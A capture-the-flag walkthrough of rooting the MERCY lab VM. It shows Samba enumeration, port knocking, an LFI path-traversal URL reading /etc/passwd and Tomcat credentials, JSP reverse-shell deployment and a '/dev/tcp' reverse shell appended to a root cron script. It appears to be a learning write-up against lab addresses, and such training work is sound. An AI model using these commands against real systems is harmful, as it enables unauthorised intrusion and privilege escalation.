</pre></td><td class='code'><pre><code class=''><span class='line'>SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==</span></code></pre></td></tr></table></div></figure>


<p>Decoding this hints at insecure passwords:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
</span><span class='line'>
</span><span class='line'>Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
</span><span class='line'>
</span><span class='line'>No fluffy bunnies for those who set insecure passwords and endanger the enterprise.</span></code></pre></td></tr></table></div></figure>


<p>From all the other services, the one that seems most likely to be bruteforced is Samba. So let&rsquo;s have a look:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbmap -H 192.168.159.137
</span><span class='line'>[+] Finding open SMB ports....
</span><span class='line'>[+] Guest SMB session established on 192.168.159.137...
</span><span class='line'>[+] IP: 192.168.159.137:445   Name: 192.168.159.137
</span><span class='line'>  Disk                                                    Permissions
</span><span class='line'>  ----                                                    -----------
</span><span class='line'>  print$                                              NO ACCESS
</span><span class='line'>  qiu                                                 NO ACCESS
</span><span class='line'>  IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure>


<p>The <em>qiu</em> share is what we want to look at. Running <strong>enum4linux</strong> we find 2 accounts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>================================
</span><span class='line'>|    Users on 192.168.159.137    |
</span><span class='line'>================================
</span><span class='line'>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy  Name: QIU   Desc:
</span><span class='line'>index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu    Name:   Desc:</span></code></pre></td></tr></table></div></figure>


<p>Following the hint, I tried the share with a password of <em>password</em> and it worked for user <em>qiu</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient //192.168.159.137/qiu -U qiu
</span><span class='line'>Enter WORKGROUP\qiu's password:
</span><span class='line'>Try "help" to get a list of possible commands.
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>  .                                   D        0  Fri Aug 31 15:07:00 2018
</span><span class='line'>  ..                                  D        0  Mon Nov 19 11:59:09 2018
</span><span class='line'>  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
</span><span class='line'>  .public                            DH        0  Sun Aug 26 10:23:24 2018
</span><span class='line'>  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
</span><span class='line'>  .cache                             DH        0  Fri Aug 31 14:22:05 2018
</span><span class='line'>  .private                           DH        0  Sun Aug 26 12:35:34 2018
</span><span class='line'>  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
</span><span class='line'>  .profile                            H      675  Sun Aug 26 09:19:34 2018</span></code></pre></td></tr></table></div></figure>


<p>I mounted the share locally for easier browsing with <code>mount -t cifs //192.168.159.137/qiu /mnt/ctf -o username=qiu -o password=password</code>. Then I started looking through what we have. The .bash_history file shows us the last commands entered by user qiu:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exit
</span><span class='line'>cd ../
</span><span class='line'>cd home
</span><span class='line'>cd qiu
</span><span class='line'>cd .secrets
</span><span class='line'>ls -al
</span><span class='line'>cd .private
</span><span class='line'>ls
</span><span class='line'>cd secrets
</span><span class='line'>ls
</span><span class='line'>ls -al
</span><span class='line'>cd ../
</span><span class='line'>ls -al
</span><span class='line'>cd opensesame
</span><span class='line'>ls -al
</span><span class='line'>./configprint
</span><span class='line'>sudo configprint
</span><span class='line'>sudo su -
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>The .public folder contains a message that doesn&rsquo;t seem relevant but is sound advice!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .public/resources/smiley
</span><span class='line'>A cheerful smile to start the day is always good. :-)</span></code></pre></td></tr></table></div></figure>


<p>We have more to check inside .private:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@deck:/mnt/ctf/.private# ls
</span><span class='line'>opensesame  readme.txt  secrets</span></code></pre></td></tr></table></div></figure>


<p>Readme contents are:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This is for your own eyes only. In case you forget the magic rules for remote administration.</span></code></pre></td></tr></table></div></figure>


<p>The secrets folder is empty. Inside <em>opensesame</em> there&rsquo;s a config file that contains port knocking instructions for opening HTTP and SSH:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat config
</span><span class='line'>Here are settings for your perusal.
</span><span class='line'>
</span><span class='line'>Port Knocking Daemon Configuration
</span><span class='line'>
</span><span class='line'>[options]
</span><span class='line'>  UseSyslog
</span><span class='line'>
</span><span class='line'>[openHTTP]
</span><span class='line'>  sequence    = 159,27391,4
</span><span class='line'>  seq_timeout = 100
</span><span class='line'>  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
</span><span class='line'>  tcpflags    = syn
</span><span class='line'>
</span><span class='line'>[closeHTTP]
</span><span class='line'>  sequence    = 4,27391,159
</span><span class='line'>  seq_timeout = 100
</span><span class='line'>  command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
</span><span class='line'>  tcpflags    = syn
</span><span class='line'>
</span><span class='line'>[openSSH]
</span><span class='line'>  sequence    = 17301,28504,9999
</span><span class='line'>  seq_timeout = 100
</span><span class='line'>  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
</span><span class='line'>  tcpflags    = syn
</span><span class='line'>
</span><span class='line'>[closeSSH]
</span><span class='line'>  sequence    = 9999,28504,17301
</span><span class='line'>  seq_timeout = 100
</span><span class='line'>  command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
</span><span class='line'>  tcpflags    = syn</span></code></pre></td></tr></table></div></figure>


<p>I used a quick Bash one-liner for the port knocking:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for port in 159 27391 4; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.159.137; done</span></code></pre></td></tr></table></div></figure>


<p>Now port 80 was opened and we find a message stating that: &ldquo;This machine shall make you plead for mercy! Bwahahahahaha!&rdquo;. In the robots.txt file we find 2 entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: /mercy
</span><span class='line'>Disallow: /nomercy</span></code></pre></td></tr></table></div></figure>


<p>Inside /mercy there&rsquo;s an index file that hints at possible RCE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to Mercy!
</span><span class='line'>
</span><span class='line'>We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.</span></code></pre></td></tr></table></div></figure>


<p>Inside /nomercy there&rsquo;s a <a href="https://github.com/robocoder/rips-scanner">RIPS installation</a>. RIPS is a PHP static scanner that looks for vulnerabilities in the source code.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/mercy/rips.png" title="rips" alt="rips"></p>

<p>The version 0.53 is vulnerable to a <a href="https://www.exploit-db.com/exploits/18660">LFI exploit</a>. Going to <a href="http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd">http://192.168.159.137/nomercy/windows/code.php?file=../../../../../../etc/passwd</a> gives us the contents of the passwd file. Here are the last 4 users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
</span><span class='line'>&lt;? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
</span><span class='line'>&lt;? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
</span><span class='line'>&lt;? fluffy:x:1003:1003::/home/fluffy:/bin/sh</span></code></pre></td></tr></table></div></figure>


<p>With this LFI, we can take a look at the <code>/etc/tomcat7/tomcat-users.xml</code> to search for credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;? &lt;role rolename="admin-gui"/&gt;
</span><span class='line'>&lt;? &lt;role rolename="manager-gui"/&gt;
</span><span class='line'>&lt;? &lt;user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/&gt;
</span><span class='line'>&lt;? &lt;user username="fluffy" password="freakishfluffybunny" roles="none"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>We can now login to Tomcat and upload a reverse shell. I used a nice tool called <a href="https://github.com/mgeeky/tomcatWarDeployer">tomcatWarDeployer</a> that automatically generates and deploys a JSP backdoor.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python tomcatWarDeployer.py -h
</span><span class='line'>Usage: tomcatWarDeployer.py [options] server
</span><span class='line'>
</span><span class='line'>  server      Specifies server address. Please also include port after colon. May start with http:// or https://
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>
</span><span class='line'>  General options:
</span><span class='line'>    -V, --version       Version information.
</span><span class='line'>    -v, --verbose       Verbose mode.
</span><span class='line'>    -s, --simulate      Simulate breach only, do not perform any offensive
</span><span class='line'>                        actions.
</span><span class='line'>    -G OUTFILE, --generate=OUTFILE
</span><span class='line'>                        Generate JSP backdoor only and put it into specified
</span><span class='line'>                        outfile path then exit. Do not perform any
</span><span class='line'>                        connections, scannings, deployment and so on.
</span><span class='line'>    -U USER, --user=USER
</span><span class='line'>                        Tomcat Manager Web Application HTTP Auth username.
</span><span class='line'>                        Default=&lt;none&gt;, will try various pairs.
</span><span class='line'>    -P PASS, --pass=PASS
</span><span class='line'>                        Tomcat Manager Web Application HTTP Auth password.
</span><span class='line'>                        Default=&lt;none&gt;, will try various pairs.
</span><span class='line'>
</span><span class='line'>  Connection options:
</span><span class='line'>    -H RHOST, --host=RHOST
</span><span class='line'>                        Remote host for reverse tcp payload connection. When
</span><span class='line'>                        specified, RPORT must be specified too. Otherwise,
</span><span class='line'>                        bind tcp payload will be deployed listening on 0.0.0.0
</span><span class='line'>    -p PORT, --port=PORT
</span><span class='line'>                        Remote port for the reverse tcp payload when used with
</span><span class='line'>                        RHOST or Local port if no RHOST specified thus acting
</span><span class='line'>                        as a Bind shell endpoint.
</span><span class='line'>    -u URL, --url=URL   Apache Tomcat management console URL. Default: empty
</span><span class='line'>    -t TIMEOUT, --timeout=TIMEOUT
</span><span class='line'>                        Speciifed timeout parameter for socket object and
</span><span class='line'>                        other timing holdups. Default: 10
</span><span class='line'>
</span><span class='line'>  Payload options:
</span><span class='line'>    -R, --remove        Remove deployed app with specified name. Can be used
</span><span class='line'>                        for post-assessment cleaning
</span><span class='line'>    -X PASSWORD, --shellpass=PASSWORD
</span><span class='line'>                        Specifies authentication password for uploaded shell,
</span><span class='line'>                        to prevent unauthenticated usage. Default: randomly
</span><span class='line'>                        generated. Specify "None" to leave the shell
</span><span class='line'>                        unauthenticated.
</span><span class='line'>    -T TITLE, --title=TITLE
</span><span class='line'>                        Specifies head&gt;title for uploaded JSP WAR payload.
</span><span class='line'>                        Default: "JSP Application"
</span><span class='line'>    -n APPNAME, --name=APPNAME
</span><span class='line'>                        Specifies JSP application name. Default: "jsp_app"
</span><span class='line'>    -x, --unload        Unload existing JSP Application with the same name.
</span><span class='line'>                        Default: no.
</span><span class='line'>    -C, --noconnect     Do not connect to the spawned shell immediately. By
</span><span class='line'>                        default this program will connect to the spawned
</span><span class='line'>                        shell, specifying this option let's you use other
</span><span class='line'>                        handlers like Metasploit, NetCat and so on.
</span><span class='line'>    -f WARFILE, --file=WARFILE
</span><span class='line'>                        Custom WAR file to deploy. By default the script will
</span><span class='line'>                        generate own WAR file on-the-fly.</span></code></pre></td></tr></table></div></figure>


<p>All I had to do was provide the credentials and the host/port combination. The host specified by the -H flag is where I&rsquo;m expecting the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python tomcatWarDeployer.py -v -x -p 8888 -H 192.168.159.129 192.168.159.137:8080 -U thisisasuperduperlonguser -P heartbreakisinevitable
</span><span class='line'>
</span><span class='line'>        tomcatWarDeployer (v. 0.5.2)
</span><span class='line'>  Apache Tomcat auto WAR deployment & launching tool
</span><span class='line'>  Mariusz B. / MGeeky '16-18
</span><span class='line'>
</span><span class='line'>Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
</span><span class='line'>
</span><span class='line'>INFO: Reverse shell will connect to: 192.168.159.129:8888.
</span><span class='line'>DEBUG: Trying Creds: ["thisisasuperduperlonguser:heartbreakisinevitable"]:
</span><span class='line'>  Browsing to "http://192.168.159.137:8080/"...
</span><span class='line'>DEBUG: Trying to fetch: "http://192.168.159.137:8080/"
</span><span class='line'>DEBUG: Trying to fetch: "http://192.168.159.137:8080/manager"
</span><span class='line'>DEBUG: Probably found something: Apache Tomcat/7.0.52 (Ubuntu)
</span><span class='line'>INFO: Apache Tomcat/7.0.52 (Ubuntu) Manager Application reached & validated.
</span><span class='line'>INFO:     At: "http://192.168.159.137:8080/manager"
</span><span class='line'>DEBUG: Generating JSP WAR backdoor code...
</span><span class='line'>DEBUG: Preparing additional code for Reverse TCP shell
</span><span class='line'>DEBUG: Generating temporary structure for jsp_app WAR at: "/tmp/tmpjo2Kgz"
</span><span class='line'>DEBUG: Working with Java at version: 11.0.3
</span><span class='line'>DEBUG: Generating web.xml with servlet-name: "JSP Application"
</span><span class='line'>DEBUG: Generating WAR file at: "/tmp/jsp_app.war"
</span><span class='line'>DEBUG: adding: META-INF/ (in=0) (out=0) (stored 0%)
</span><span class='line'>adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
</span><span class='line'>adding: files/ (in=0) (out=0) (stored 0%)
</span><span class='line'>adding: files/META-INF/ (in=0) (out=0) (stored 0%)
</span><span class='line'>adding: files/META-INF/MANIFEST.MF (in=66) (out=65) (deflated 1%)
</span><span class='line'>adding: files/WEB-INF/ (in=0) (out=0) (stored 0%)
</span><span class='line'>adding: files/WEB-INF/web.xml (in=505) (out=254) (deflated 49%)
</span><span class='line'>adding: index.jsp (in=4498) (out=1688) (deflated 62%)
</span><span class='line'>Total:
</span><span class='line'>------
</span><span class='line'>(in = 5109) (out = 2917) (deflated 42%)
</span><span class='line'>DEBUG: Tree command not available. Skipping.
</span><span class='line'>DEBUG: WAR file structure:
</span><span class='line'>DEBUG:
</span><span class='line'>DEBUG: Checking if app jsp_app is deployed at: http://192.168.159.137:8080/manager
</span><span class='line'>DEBUG: App not deployed.
</span><span class='line'>INFO: It looks that the application with specified name "jsp_app" has not been deployed yet.
</span><span class='line'>DEBUG: Deploying application: jsp_app from file: "/tmp/jsp_app.war"
</span><span class='line'>DEBUG: Removing temporary WAR directory: "/tmp/tmpjo2Kgz"
</span><span class='line'>INFO: WAR DEPLOYED! Invoking it...
</span><span class='line'>DEBUG: Spawned shell handling thread. Awaiting for the event...
</span><span class='line'>DEBUG: Awaiting for reverse-shell handler to set-up
</span><span class='line'>DEBUG: Establishing listener for incoming reverse TCP shell at 192.168.159.129:8888
</span><span class='line'>DEBUG: Socket is binded to local port now, awaiting for clients...
</span><span class='line'>DEBUG: Invoking application at url: "http://192.168.159.137:8080/jsp_app/"
</span><span class='line'>DEBUG: Adding 'X-Pass: u48rHHa9MRdK' header for shell functionality authentication.
</span><span class='line'>DEBUG: Incoming client: 192.168.159.137:60760
</span><span class='line'>DEBUG: Application invoked correctly.
</span><span class='line'>INFO: ------------------------------------------------------------
</span><span class='line'>INFO: JSP Backdoor up & running on http://192.168.159.137:8080/jsp_app/
</span><span class='line'>INFO:
</span><span class='line'>Happy pwning. Here take that password for web shell: 'u48rHHa9MRdK'
</span><span class='line'>INFO: ------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>INFO: Connected with: tomcat7@MERCY
</span><span class='line'>
</span><span class='line'>tomcat7@MERCY $</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, I found this shell too unstable, so I switched to Metasploit and spawned a Meterpreter shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.159.129:4444
</span><span class='line'>[*] Retrieving session ID and CSRF token...
</span><span class='line'>[*] Uploading and deploying oAsjCH3JZVzYcanqTIdZkOcn...
</span><span class='line'>[*] Executing oAsjCH3JZVzYcanqTIdZkOcn...
</span><span class='line'>[*] Undeploying oAsjCH3JZVzYcanqTIdZkOcn ...
</span><span class='line'>[*] Sending stage (53844 bytes) to 192.168.159.137
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.159.129:4444 -&gt; 192.168.159.137:41182) at 2019-06-04 11:04:16 -0400
</span><span class='line'>
</span><span class='line'>meterpreter &gt;</span></code></pre></td></tr></table></div></figure>


<p>I dropped into a shell and upgraded it to a proper terminal with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</code>. From this shell, I was able to switch to user fluffy with the previously found password of <code>freakishfluffybunny</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
</span><span class='line'>su fluffy
</span><span class='line'>Password: freakishfluffybunny
</span><span class='line'>
</span><span class='line'>Added user fluffy.
</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>fluffy@MERCY:~$ ls -a
</span><span class='line'>ls -a
</span><span class='line'>.  ..  .bash_history  .private</span></code></pre></td></tr></table></div></figure>


<p>There are a few interesting files in fluffy&rsquo;s home:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fluffy@MERCY:~/.private/secrets$ ls -a
</span><span class='line'>ls -a
</span><span class='line'>.  ..  backup.save  .secrets  timeclock</span></code></pre></td></tr></table></div></figure>


<p>The backup.save file is a shell script that just outputs a text:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat backup.save
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>echo Backing Up Files;</span></code></pre></td></tr></table></div></figure>


<p>In .secrets we have a Try harder! message. And the timeclock outputs the current date and time inside the web folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>luffy@MERCY:~/.private/secrets$ cat timeclock
</span><span class='line'>cat timeclock
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>now=$(date)
</span><span class='line'>echo "The system time is: $now." &gt; ../../../../../var/www/html/time
</span><span class='line'>echo "Time check courtesy of LINUX" &gt;&gt; ../../../../../var/www/html/time
</span><span class='line'>chown www-data:www-data ../../../../../var/www/html/time</span></code></pre></td></tr></table></div></figure>


<p>This should be the local time reference from earlier. What&rsquo;s more interesting, this script is owned by root and everyone has full permissions on it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwxrwxrwx 1 root   root   222 Nov 20  2018 timeclock</span></code></pre></td></tr></table></div></figure>


<p>I appended a bash one-liner to the script to send me a shell: <code>bash -i >&amp; /dev/tcp/192.168.159.129/8888 0>&amp;1</code>. But if we just run the script, the shell will still be with fluffy&rsquo;s privileges. There should be a cron or something run by root. As I was investigating, I received a root shell on my listener!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@MERCY:~# ls /root
</span><span class='line'>ls /root
</span><span class='line'>author-secret.txt
</span><span class='line'>config
</span><span class='line'>proof.txt
</span><span class='line'>root@MERCY:~# cat /root/proof.txt
</span><span class='line'>cat /root/proof.txt
</span><span class='line'>Congratulations on rooting MERCY. :-)</span></code></pre></td></tr></table></div></figure>


